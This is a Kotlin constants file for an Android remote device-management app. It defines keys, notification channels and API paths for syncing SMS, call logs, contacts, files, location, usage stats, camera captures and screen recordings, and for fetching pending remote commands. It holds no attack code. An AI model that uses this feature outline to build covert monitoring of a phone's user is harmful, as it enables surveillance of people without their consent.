package com.devicemanager.util

/**
 * Application-wide constants.
 */
object Constants {
    // SharedPreferences
    const val PREFS_NAME = "device_prefs"
    const val KEY_DEVICE_TOKEN = "device_token"
    const val KEY_DEVICE_ID = "device_id"
    const val KEY_SERVER_URL = "server_url"
    const val KEY_DEVICE_NAME = "device_name"
    const val KEY_IS_PAIRED = "is_paired"
    const val KEY_IS_SETUP_COMPLETE = "is_setup_complete"
    const val KEY_LAST_SYNC_TIME = "last_sync_time"
    const val KEY_LAST_TELEMETRY_TIME = "last_telemetry_time"
    const val KEY_LAST_LOCATION_TIME = "last_location_time"

    // Notification channels
    const val CHANNEL_MAIN = "main_service_channel"
    const val CHANNEL_CAMERA = "camera_service_channel"
    const val CHANNEL_SCREEN_RECORD = "screen_record_channel"
    const val CHANNEL_SCREEN_STREAM = "screen_stream_channel"

    // Notification IDs
    const val NOTIF_ID_MAIN = 1001
    const val NOTIF_ID_CAMERA = 1002
    const val NOTIF_ID_SCREEN_RECORD = 1003
    const val NOTIF_ID_SCREEN_STREAM = 1004

    // WorkManager unique work names
    const val WORK_TELEMETRY = "periodic_telemetry"
    const val WORK_LOCATION = "periodic_location"
    const val WORK_SYNC = "periodic_sync"
    const val WORK_USAGE_STATS = "periodic_usage_stats"

    // Work intervals (milliseconds)
    const val TELEMETRY_INTERVAL_MIN = 15L
    const val LOCATION_INTERVAL_MIN = 30L
    const val SYNC_INTERVAL_MIN = 15L
    const val USAGE_STATS_INTERVAL_HOURS = 6L

    // API paths
    const val API_REGISTER = "/api/devices/register"
    const val API_TELEMETRY = "/api/telemetry"
    const val API_LOCATIONS = "/api/locations"
    const val API_NOTIFICATIONS = "/api/notifications"
    const val API_USAGE = "/api/usage"
    const val API_CONTACTS_SYNC = "/api/contacts/sync"
    const val API_CALLS_SYNC = "/api/calls/sync"
    const val API_SMS_SYNC = "/api/sms/sync"
    const val API_FILES_SYNC = "/api/files/sync"
    const val API_UPLOAD = "/api/upload"
    const val API_PENDING_COMMANDS = "/api/devices/{id}/commands/pending"
    const val API_COMMAND_STATUS = "/api/commands/{id}/status"
    const val API_PERMISSIONS = "/api/devices/{id}/permissions"

    // WebSocket
    const val WS_PATH = "/ws"
    const val WS_RECONNECT_DELAY_MS = 5000L
    const val WS_PING_INTERVAL_MS = 30000L

    // Command timeout
    const val COMMAND_TIMEOUT_MS = 120000L

    // File types for upload
    const val FILE_TYPE_CAMERA_CAPTURE = "camera_capture"
    const val FILE_TYPE_SCREEN_RECORDING = "screen_recording"
    const val FILE_TYPE_GENERIC = "generic"

    // Permission names (for server sync)
    const val PERM_LOCATION = "LOCATION"
    const val PERM_CAMERA = "CAMERA"
    const val PERM_MICROPHONE = "MICROPHONE"
    const val PERM_NOTIFICATIONS = "NOTIFICATIONS"
    const val PERM_CONTACTS = "CONTACTS"
    const val PERM_CALL_LOG = "CALL_LOG"
    const val PERM_SMS = "SMS"
    const val PERM_USAGE_ACCESS = "USAGE_ACCESS"
    const val PERM_NOTIFICATION_ACCESS = "NOTIFICATION_ACCESS"
    const val PERM_SCREEN_CAPTURE = "SCREEN_CAPTURE"
    const val PERM_STORAGE = "STORAGE"
}
